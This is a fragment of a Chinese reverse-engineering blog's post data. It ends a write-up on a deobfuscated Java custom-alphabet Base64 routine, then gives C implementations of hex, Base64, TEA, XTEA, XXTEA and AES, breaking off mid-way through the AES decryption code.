     case 56474:                                          case 1752710:                                             var7 = 1753452;                                             continue;                                          case 1753452:                                             if (var12 &lt; var28.length()) {                                                char var32 = var28.charAt(var12);                                                var28.setCharAt(var12, (char)(var32 &amp; ~var15 | ~var32 &amp; var15));                                                var7 = 1750568;                                                continue;                                             }                                             break label197;                                          case 1753484:                                             break label213;                                          case 1753513:                                             String var56 = \"ۨۢ\";                                             var7 = var13;                                             break label219;                                          case 1753544:                                             break label244;                                          case 1753545:                                          case 1754662:                                             var7 = 1755465;                                             continue;                                          case 1754376:                                             var7 = var18 ^ var20 | var18 &amp; var20;                                             int var22 = 1748799;                                             var11 = var7;                                             var10 = var8;                                             var7 = var22;                                             continue;                                          case 1754629:                                             var7 = 1752616;                                             var4 = var5;                                             continue;                                          case 1754656:                                             var7 = 1751653;                                             var9 = 0;                                             continue;                                          case 1755374:                                             break label191;                                          case 1755465:                                             StringBuilder var27 = var28.append(var4);                                             if (var13 &gt;= 1) {                                                var1 = (char)var2;                                                break label191;                                             }                                             ۣ۟ۧ۠.۟ۢۥۢ();                                             var1 = (char)var2;                                             break;                                          case 1755468:                                             var8 = 0;                                             break;                                          default:                                             continue;                                       }                                       String var55 = \"ۧۨۡ\";                                       var7 = var15;                                       break label223;                                    }                                    var7 = 1747808;                                 }                                 var7 = 1748679;                              }                              String var62 = \"ۥۧۧ\";                              var7 = 1748769;                           }                           var7 = 1747928;                        }                        int var50 = 1753547;                        var8 = var7;                        var7 = 1753547;                     }                     int var43 = 1754656;                     var15 = var7;                     var7 = 1754656;                  }                  int var51 = 1752580;                  var9 = var7;                  var7 = 1752580;               }               int var44 = 1754376;               var20 = var7;               var7 = var44;            }            var7 = 1751561;         }         int var52 = 1750753;         var16 = var7;         var7 = 1750753;      }   }}\n\n反混淆结束后可以勉强看出 Java 层是一个换表的 Base64，同时 Base64 表是被异或处理过的同时推荐使用 Recaf，可以把所有非 ASCII 码表的字符重命名，生成一份 Mapping，对逆向有很大的帮助\n\n码表操作\n\n\n执行后可以得到码表 nopqrstDEFGHIJKLhijklUVQRST/WXYZabABCcdefgmuv6789+wxyz012345MNOP\n这里的 var15 经过追踪得到是 传入数组的长度\n这里的 var32 &amp; ~var15 | ~var32 &amp; var15 其实就是 var32 ^ var15 被拆开了 其实是等价的最终 Java 层的功能就是 换表base64 + 每个字符异或上输入字符串的长度\n","tags":["Reverse","NP","Java","Obfuscation"]},{"title":"常见加密解密编码算法","url":"/2024/10/06/encode_decode/","content":"常见的加密解密算法实现汇总\n\n\nHEX#include \"stdio.h\" // sprintf()函数声明所在的头文件char data[] = \"Hello World!!\\r\\n\";char res[32];int str_2_hex_str(char *dest, char *src){    int len = strlen(src); // 获取接收数据长度    int i,j;    for (i = 0, j = 0; i &lt; len; i++) {        sprintf(&amp;dest[j], \"%02X\", src[i]);        j+=2; // 每个16进制占2个长度    }    dest[j] = '\\0'; // 添加字符串结束符    return j; // 返回字符串长度}int len = str_2_hex_str(res, data);///////////////////////////////#include &lt;stdlib.h&gt; // 要使用strtol()库函数，需要包含头文件char data[] = \"48656C6C6F20576F726C6421210D0A\"; // 假如，我们接收到这样的数据char res[32]; // 储存转换后的结果int hex_str_2_str(char *dest, char *src){    int len = strlen(src); // 获取接收数据长度    int i,j;    for (i = 0, j = 0; i &lt; len; i+=2) { // 每次取两个字符        char tmp_buf[3]; // 每两个字符组成一个16进制字符串，同时结尾需要空字符来告诉编译器我们的是字符串        char *endptr; // 保存已转换数值后的下一个字符        // 以下为取待转换的16进制字符串        tmp_buf[0] = src[i];        tmp_buf[1] = src[i + 1];        tmp_buf[2] = '\\0'; // 记得添加空字符        // 转换成16进制，base传16即可        dest[j++] = strtol(tmp_buf, &amp;endptr, 16);    }    dest[j] = '\\0'; // 添加字符串结束符    return j;}int len = hex_str_2_str(res, data);\nBASE64//base64加密char base64[65] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";void encodeBase64(char* str,int len,char** in){        //读取3个字节zxc，转换为二进制01111010 01111000 01100011    //转换为4个6位字节，011110 100111 100001 100011    //不足8位在前补0，变成00011110 00100111 00100001 00100011    //若剩余的字节数不足以构成4个字节，补等号    int encodeStrLen = 1 + (len/3)*4 ,k=0;    encodeStrLen += len%3 ? 4 : 0;    char* encodeStr = (char*)(malloc(sizeof(char)*encodeStrLen));    for(int i=0;i&lt;len;i++){        if(len - i &gt;= 3){            encodeStr[k++] = base64[(unsigned char)str[i]&gt;&gt;2];            encodeStr[k++] = base64[((unsigned char)str[i]&amp;0x03)&lt;&lt;4 | (unsigned char)str[++i]&gt;&gt;4];            encodeStr[k++] = base64[((unsigned char)str[i]&amp;0x0f)&lt;&lt;2 | (unsigned char)str[++i]&gt;&gt;6];            encodeStr[k++] = base64[(unsigned char)str[i]&amp;0x3f];        }else if(len-i == 2){            encodeStr[k++] = base64[(unsigned char)str[i] &gt;&gt; 2];            encodeStr[k++] = base64[((unsigned char)str[i]&amp;0x03) &lt;&lt; 4 | ((unsigned char)str[++i] &gt;&gt; 4)];            encodeStr[k++] = base64[((unsigned char)str[i]&amp;0x0f) &lt;&lt; 2];            encodeStr[k++] = '=';        }else{            encodeStr[k++] = base64[(unsigned char)str[i] &gt;&gt; 2];            encodeStr[k++] = base64[((unsigned char)str[i] &amp; 0x03) &lt;&lt; 4];                                                                                                              //末尾补两个等于号            encodeStr[k++] = '=';            encodeStr[k++] = '=';        }    }    encodeStr[k] = '\\0';    *in = encodeStr;}/*** 解码既编码的逆过程，先找出编码后的字符在编码之前代表的数字* 编码中将3位个字符变成4个字符，得到这4个字符的每个字符代表的原本数字* 因为在编码中间每个字符用base64码表进行了替换，所以这里要先换回来* 在对换回来的数字进行位运算使其还原成3个字符*/void decodeBase64(char* str,int len,char** in){        char ascill[129];    int k = 0;    for(int i=0;i&lt;64;i++){        ascill[base64[i]] = k++;    }    int decodeStrlen = len / 4 * 3 + 1;    char* decodeStr = (char*)malloc(sizeof(char)*decodeStrlen);    k = 0;    for(int i=0;i&lt;len;i++){        decodeStr[k++] = (ascill[str[i]] &lt;&lt; 2) | (ascill[str[++i]] &gt;&gt; 4);        if(str[i+1] == '='){            break;        }        decodeStr[k++] = (ascill[str[i]] &lt;&lt; 4) |  (ascill[str[++i]] &gt;&gt; 2);        if(str[i+1] == '='){            break;        }        decodeStr[k++] = (ascill[str[i]] &lt;&lt; 6) | (ascill[str[++i]]);    }    decodeStr[k] = '\\0';    *in = decodeStr;}int main(){    char mm[]=\"UAsFvs3tDyTxFPGb7WbyBYSm05VWrJxgjArj9mx490pfH1LO\";    char *mm1;    char *mm2;    encodeBase64(mm,strlen(mm),&amp;mm1);    decodeBase64(mm1,strlen(mm1),&amp;mm2);    puts(mm2);}\nXXTEA#include &lt;stdint.h&gt;#define DELTA 0x9e3779b9#define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))//容易魔改void btea(uint32_t * v, int n, uint32_t const key[4]) {//v为数据，n为数据长度(负时为解密)，key为密钥    uint32_t y,  z, sum;  unsigned p, rounds, e;    if (n &gt; 1)    /* Coding Part */    {        rounds = 6 + 52 / n;        sum = 0;        z = v[n - 1];        do {            sum += DELTA;            e = (sum &gt;&gt; 2) &amp; 3;            for (p = 0; p &lt; n - 1; p++) {                y = v[p + 1];                z = v[p] += MX;            }            y = v[0];            z = v[n - 1] += MX;        } while (-- rounds );    } else if (n &lt; -1)    /* Decoding Part */    {        n = -n;        rounds = 6 + 52 / n;        sum = rounds * DELTA;        y = v[0];        do {            e = (sum &gt;&gt; 2) &amp; 3;            for (p = n - 1; p &gt; 0; p--) {                z = v[p - 1];                y = v[p] -= MX;            }            z = v[n - 1];            y = v[0] -= MX;            sum -= DELTA;        } while (-- rounds );    }}\n\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define delta 0x9e3779b9int main(){    unsigned int v[8] = {0x10BD3B47, 0x6155E0F9, 0x6AF7EBC5, 0x8D23435F, 0x1A091605, 0xD43D40EF, 0xB4B16A67, 0x6B3578A9};    unsigned int key[4] = {0x00001234, 0x00002345, 0x00004567, 0x00006789};    unsigned int sum = 0;    unsigned int y, z, p, rounds, e;    int n = 8;    int i = 0;    rounds = 6 + 52 / n;    y = v[0];    sum = rounds * delta;    do    {        e = sum &gt;&gt; 2 &amp; 3;        for (p = n - 1; p &gt; 0; p--)        {            z = v[p - 1];            v[p] -= ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((key[(p &amp; 3) ^ e] ^ z) + (y ^ sum)));            y = v[p];        }        z = v[n - 1];        v[0] -= (((key[(p ^ e) &amp; 3] ^ z) + (y ^ sum)) ^ (((y &lt;&lt; 2) ^ (z &gt;&gt; 5)) + ((z &lt;&lt; 4) ^ (y &gt;&gt; 3))));        y = v[0];        sum = sum - delta;    } while (--rounds);    for (i = 0; i &lt; n; i++)    {        printf(\"%c%c%c%c\", *((char *)&amp;v[i] + 0), *((char *)&amp;v[i] + 1), *((char *)&amp;v[i] + 2), *((char *)&amp;v[i] + 3));        // printf(\"%c%c%c%c\",*((char*)&amp;v[i]+3),*((char*)&amp;v[i]+2),*((char*)&amp;v[i]+1),*((char*)&amp;v[i]+0));    }    return 0;}\n\nXTea#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]){    unsigned int i;    uint32_t v0 = v[0], v1 = v[1], sum = 0, delta = 0x9E3779B9;    for (i = 0; i &lt; num_rounds; i++)    {        v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);        sum += delta;        v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);    }    v[0] = v0;    v[1] = v1;}void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]){    unsigned int i;    uint32_t v0 = v[0], v1 = v[1], delta = 0x9E3779B9, sum = delta * num_rounds;    for (i = 0; i &lt; num_rounds; i++)    {        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt; 11) &amp; 3]);        sum -= delta;        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]);    }    v[0] = v0;    v[1] = v1;}\n\nTea#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void encrypt(uint32_t *v, uint32_t *k){    uint32_t v0 = v[0], v1 = v[1], sum = 0, i;    uint32_t delta = 0x9e3779b9;    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];    for (i = 0; i &lt; 32; i++)    {        sum += delta;        v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);        v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);    }    v[0] = v0;    v[1] = v1;}void decrypt(uint32_t *v, uint32_t *k){    uint32_t v0 = v[0], v1 = v[1], i;    uint32_t delta = 0x9e3779b9;    uint32_t sum = delta * 32;    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];    for (i = 0; i &lt; 32; i++)    {        v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3);        v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1);        sum -= delta;    }    v[0] = v0;    v[1] = v1;}\n\nAES伪代码Cipher(byte in[4*Nb], byte out[4*Nb], word w[Nb*(Nr+1)])begin    byte state[4, Nb]    state = in    AddRoundkey(state, w[0, Nb-1])    for round = 1 step 1 to Nr-1        SubBytes(state)        ShiftRows(state)        MixColumns(state)        AddRoundKey(state, w[round*Nb, (round+1)*Nb - 1])    end    SubBytes(state)    ShiftRows(state)    AddRoundKey(state, w[Nr*Nb, (Nr+1)*Nb - 1])    out = stateendInvCipher(byte in[4*Nb], byte out[4*Nb], word w[Nb*(Nr_1)])begin    byte stae[4, Nb]    state = in    AddRoundKey(state, w[Nr*Nb, (Nr+1)*Nb - 1])    for round = Nr-1 step -1 downto 1        InvShiftRows(state)        InvSubBytes(state)        AddRoundKey(state, w[round*Nb, (round+1)*Nb - 1])        InvMixColumns(state)    end    InvShiftRows(state)    InvSubBytes(state)    AddRoundKey(state, w[0, Nb-1])    out = stateend// 另一种等效的加解密步骤, Intel AES指令集采用的是这种步骤(两者加密密钥扩展是一样的)// SubBytes和ShiftRows可以交换// InvMixColumns(AddRoundKey(state, RoundKey)) = AddRoundKey(InvMixColumns(state), InvMixColumns(RoundKey)Cipher(byte in[4*Nb], byte out[4*Nb], word w[Nb*(Nr+1)])begin    byte state[4, Nb]    state = in    AddRoundkey(state, w[0, Nb-1])    for round = 1 step 1 to Nr-1        ShiftRows(state)        SubBytes(state)        MixColumns(state)        AddRoundKey(state, w[round*Nb, (round+1)*Nb - 1])    end    ShiftRows(state)    SubBytes(state)    AddRoundKey(state, w[Nr*Nb, (Nr+1)*Nb - 1])    out = stateendInvCipher(byte in[4*Nb], byte out[4*Nb], word w[Nb*(Nr_1)])begin    byte stae[4, Nb]    state = in    AddRoundKey(state, w[Nr*Nb, (Nr+1)*Nb - 1])    for round = Nr-1 step -1 downto 1        InvSubBytes(state)        InvShiftRows(state)        InvMixColumns(state)        AddRoundKey(state, w[round*Nb, (round+1)*Nb - 1])    end    InvSubBytes(state)    InvShiftRows(state)    AddRoundKey(state, w[0, Nb-1])    out = stateend// 解密密钥扩展需要增加如下步骤for i = 0 step 1 to (Nb*(Nr+1)-1)    dw[i] = w[i]end// 增加的运算for round=1 step 1 to Nr-1    InvMixColumns(dw[round*Nb, (round+1)*Nb-1])end for\n\n代码 1#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;void AddRoundKey(unsigned char *plaintext, unsigned char * CipherKey)/*轮密钥加*/{\tfor (int j = 0; j &lt; 16; j++)  plaintext[j] = plaintext[j] ^ CipherKey[j];}void SubBytes(unsigned char *plaintext, unsigned char *plaintextencrypt, int count)/*S盒置换*/{\tunsigned int row, column;\tunsigned char Sbox[16][16] = {\t\t      /* 0     1     2     3     4     5     6     7     8     9     a     b     c     d     e     f */\t\t/*0*/{ 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76 },\t\t/*1*/{ 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0 },\t\t/*2*/{ 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15 },\t\t/*3*/{ 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75 },\t\t/*4*/{ 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84 },\t\t/*5*/{ 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf },\t\t/*6*/{ 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8 },\t\t/*7*/{ 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2 },\t\t/*8*/{ 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73 },\t\t/*9*/{ 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb },\t\t/*a*/{ 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79 },\t\t/*b*/{ 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08 },\t\t/*c*/{ 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a },\t\t/*d*/{ 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e },\t\t/*e*/{ 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf },\t\t/*f*/{ 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 }\t};// 填充Sbox矩阵\tfor (int i = 0; i &lt; count; i++)\t{\t\trow = (plaintext[i] &amp; 0xF0) &gt;&gt; 4;\t\tcolumn = plaintext[i] &amp; 0x0F;\t\tplaintextencrypt[i] = Sbox[row][column];\t}}void SubBytesRe(unsigned char *plaintext, unsigned char *plaintextencrypt, int count)/*S盒逆置换*/{\tunsigned int row, column;\tunsigned char Sbox[16][16] = {\t\t/* 0     1     2     3     4     5     6     7     8     9     a     b     c     d     e     f */\t\t{0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb},\t\t{0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb},\t\t{0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e},\t\t{0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25},\t\t{0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92},\t\t{0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84},\t\t{0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06},\t\t{0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b},\t\t{0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73},\t\t{0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e},\t\t{0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b},\t\t{0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4},\t\t{0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f},\t\t{0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef},\t\t{0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61},\t\t{0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d}\t};\t// 填充Sbox矩阵\tfor (int i = 0; i &lt; count; i++)\t{\t\trow = (plaintext[i] &amp; 0xF0) &gt;&gt; 4;\t\tcolumn = plaintext[i] &amp; 0x0F;\t\tplaintextencrypt[i] = Sbox[row][column];\t}}void ShiftRowsRe(unsigned char *plaintextencrypt)/*行移位的逆*/{\tunsigned char temp = 0;\tfor (int i = 0; i &lt; 4; i++)//第i行\t{\t\tfor (int j = 0; j &lt; 4 - i; j++)//第j次左移\t\t{\t\t\ttemp = plaintextencrypt[i];\t\t\tfor (int k = 0; k &lt; 4; k++)\t\t\t\tplaintextencrypt[i + 4 * k] = plaintextencrypt[i + 4 * (k + 1)];\t\t\tplaintextencrypt[i + 12] = temp;\t\t}\t}}void ShiftRows(unsigned char *plaintextencrypt)/*行移位*/{\tunsigned char temp = 0;\tfor (int i = 0; i &lt; 4; i++)//第i行\t{\t\tfor (int j = 0; j &lt; i; j++)//第j次左移\t\t{\t\t\ttemp = plaintextencrypt[i];\t\t\tfor (int k = 0; k &lt; 4; k++)\t\t\t\tplaintextencrypt[i + 4 * k] = plaintextencrypt[i + 4 * (k + 1)];\t\t\tplaintextencrypt[i + 12] = temp;\t\t}\t}}unsigned char Mult2(unsigned char num)/*列混淆*/{\tunsigned char temp = num &lt;&lt; 1;\tif ((num &gt;&gt; 7) &amp; 0x01)\t\ttemp = temp ^ 27;\treturn temp;}unsigned char Mult3(unsigned char num){\treturn Mult2(num) ^ num;}void MixColumns(unsigned char *plaintextencrypt, unsigned char *plaintextcrypt){\tint i;\tfor (i = 0; i &lt; 4; i++)\t\tplaintextcrypt[4 * i] = Mult2(plaintextencrypt[4 * i]) ^ Mult3(plaintextencrypt[4 * i + 1]) ^ plaintextencrypt[4 * i + 2] ^ plaintextencrypt[4 * i + 3];\tfor (i = 0; i &lt; 4; i++)\t\tplaintextcrypt[4 * i + 1] = plaintextencrypt[4 * i] ^ Mult2(plaintextencrypt[4 * i + 1]) ^ Mult3(plaintextencrypt[4 * i + 2]) ^ plaintextencrypt[4 * i + 3];\tfor (i = 0; i &lt; 4; i++)\t\tplaintextcrypt[4 * i + 2] = plaintextencrypt[4 * i] ^ plaintextencrypt[4 * i + 1] ^ Mult2(plaintextencrypt[4 * i + 2]) ^ Mult3(plaintextencrypt[4 * i + 3]);\tfor (i = 0; i &lt; 4; i++)\t\tplaintextcrypt[4 * i + 3] = Mult3(plaintextencrypt[4 * i]) ^ plaintextencrypt[4 * i + 1] ^ plaintextencrypt[4 * i + 2] ^ Mult2(plaintextencrypt[4 * i + 3]);}/*逆列混淆*/ #define xtime(x)   ((x&lt;&lt;1) ^ (((x&gt;&gt;7) &amp; 1) * 0x1b))#define Multiply(x,y) (((y &amp; 1) * x) ^ ((y&gt;&gt;1 &amp; 1) * xtime(x)) ^ ((y&gt;&gt;2 &amp; 1) * xtime(xtime(x))) ^ ((y&gt;&gt;3 &amp; 1) * xtime(xtime(xtime(x)))) ^ ((y&gt;&gt;4 &amp; 1) * xtime(xtime(xtime(xtime(x))))))void MixColumnsRe(unsigned char *state){\t\tunsigned char a, b, c, d;\tfor (int i = 0; i &lt; 4; i++)\t{\t\ta = state[4*i];\t\tb = state[4*i+1];\t\tc = state[4*i+2];\t\td = state[4*i+3];\t\tstate[4 * i] = Multiply(a, 0x0e) ^ Multiply(b, 0x0b) ^ Multiply(c, 0x0d) ^ Multiply(d, 0x09);\t\tstate[4 * i + 1] = Multiply(a, 0x09) ^ Multiply(b, 0x0e) ^ Multiply(c, 0x0b) ^ Multiply(d, 0x0d);\t\tstate[4 * i + 2] = Multiply(a, 0x0d) ^ Multiply(b, 0x09) ^ Multiply(c, 0x0e) ^ Multiply(d, 0x0b);\t\tstate[4 * i + 3] = Multiply(a, 0x0b) ^ Multiply(b, 0x0d) ^ Multiply(c, 0x09) ^ Multiply(d, 0x0e);\t}}int CharToWord(unsigned char *character, int first)/*字节转字*/{\treturn (((int)character[first] &amp; 0x000000ff) &lt;&lt; 24) | (((int)character[first + 1] &amp; 0x000000ff) &lt;&lt; 16) | (((int)character[first + 2] &amp; 0x000000ff) &lt;&lt; 8) | ((int)character[first + 3] &amp; 0x000000ff);}void WordToChar(unsigned int word, unsigned char *character)/*字转字节*/{\tfor (int i = 0; i &lt; 4; character[i++] = (word &gt;&gt; (8 * (3 - i))) &amp; 0xFF);}void ExtendCipherKey(unsigned int *CipherKey_word, int round)/*密钥扩展*/{\tunsigned char CipherKeyChar[4] = { 0 },CipherKeyCharEncrypt[4] = { 0 };\tunsigned int Rcon[10] = { 0x01000000,0x02000000,0x04000000,0x08000000,0x10000000,0x20000000,0x40000000,0x80000000,0x1B000000,0x36000000 };\t//轮常量\tfor (int i = 4; i &lt; 8; i++)\t{\t\tif (!(i % 4))\t\t{\t\t\tWordToChar((CipherKey_word[i - 1] &gt;&gt; 24) | (CipherKey_word[i - 1] &lt;&lt; 8), CipherKeyChar);\t\t\tSubBytes(CipherKeyChar, CipherKeyCharEncrypt, 4);\t\t\tCipherKey_word[i] = CipherKey_word[i - 4] ^ CharToWord(CipherKeyCharEncrypt, 0) ^ Rcon[round];\t\t}\t\telse\t\t\tCipherKey_word[i] = CipherKey_word[i - 4] ^ CipherKey_word[i - 1];\t}}void main(){\tprintf(\"**************AES加解密***************\\n\");\tint i = 0, k;\tunsigned char PlainText[16] = { 0x32,0x43,0xf6,0xa8,0x88,0x5a,0x30,0x8d,0x31,0x31,0x98,0xa2,0xe0,0x37,0x07,0x34 },\t\tCipherKey[16] = { 0x2b,0x7e,0x15,0x16,0x28,0xae,0xd2,0xa6,0xab,0xf7,0x15,0x88,0x09,0xcf,0x4f,0x3c },\t\tCipherKey1[16] = { 0x2b,0x7e,0x15,0x16,0x28,0xae,0xd2,0xa6,0xab,0xf7,0x15,0x88,0x09,0xcf,0x4f,0x3c },\t\tPlainText1[16] = { 0 },\t\tPlainText2[16] = { 0 };\tunsigned int CipherKey_word[44] = { 0 };\tfor (i = 0; i &lt; 4; CipherKey_word[i++] = CharToWord(CipherKey, 4 * i));\tprintf(\"密钥：\");\tfor (k = 0; k &lt; 16; k++) printf(\"%2X \", CipherKey[k]);\tprintf(\"\\n明文：\");\tfor (k = 0; k &lt; 16; k++) printf(\"%02X \", PlainText[k]);\tprintf(\"\\n**************开始加密****************\");\tAddRoundKey(PlainText, CipherKey);\tfor (i = 0; i &lt; 9; i++)\t{\t\tprintf(\"\\n第%d轮循环：\\n\", i + 1);\t\tSubBytes(PlainText, PlainText1, 16);/*S盒置换*/\t\tShiftRows(PlainText1);\t/*行移位*/\t\tMixColumns(PlainText1, PlainText2);\t/*列混淆*/\t\tExtendCipherKey(CipherKey_word + 4 * i, i);/*子密钥生成*/\t\tfor (k = 0; k &lt; 4; k++)  WordToChar(CipherKey_word[k + 4 * (i + 1)], CipherKey + 4 * k);\t\tprintf(\"此时的子密钥为：    \");\t\tfor (k = 0; k &lt; 16; k++)  printf(\"%02X \", CipherKey[k]);\t\tAddRoundKey(PlainText2, CipherKey);/*轮密钥加*/\t\tfor (k = 0; k &lt; 16; k++)  PlainText[k] = PlainText2[k];\t\tprintf(\"\\n当前明文加密之后为：\");\t\tfor (k = 0; k &lt; 16; k++)  printf(\"%02X \", PlainText2[k]);\t\tprintf(\"\\n\");\t}\tprintf(\"\\n最后一次循环：\\n\");\tSubBytes(PlainText, PlainText1, 16);\tShiftRows(PlainText1);\tExtendCipherKey(CipherKey_word + 4 * i, i);\tfor (k = 0; k &lt; 4;WordToChar(CipherKey_word[k + 4 * (i + 1)], CipherKey + 4 * k), k++);\tprintf(\"此时的子密钥为：     \");\tfor (k = 0; k &lt; 16; k++)  printf(\"%02X \", CipherKey[k]);\tAddRoundKey(PlainText1, CipherKey);\tprintf(\"\\n\\n最终AES加密后的密文为：\");\tfor (i = 0; i &lt; 16; i++)  printf(\"%02X \", PlainText1[i]);\tprintf(\"\\n\\n**************开始解密***************\");\tAddRoundKey(PlainText1, CipherKey);\tfor (i = 0; i &lt; 9; i++)\t{\t\tprintf(\"\\n第%d次循环：\", i + 1);\t    SubBytesRe(PlainText1, PlainText, 16);/*S盒置换*/\t\tfor (k = 0; k &lt; 4; WordToChar(CipherKey_word[k + 40 - 4 * (i + 1)], CipherKey + 4 * k),k++);/*子密钥生成*/\t\tShiftRowsRe(PlainText);/*行移位逆*/\t\tAddRoundKey(PlainText, CipherKey);/*轮密钥加*/\t\tMixColumnsRe(PlainText);/*列混淆逆运算*/\t\tfor (k = 0; k &lt; 16;PlainText1[k] = 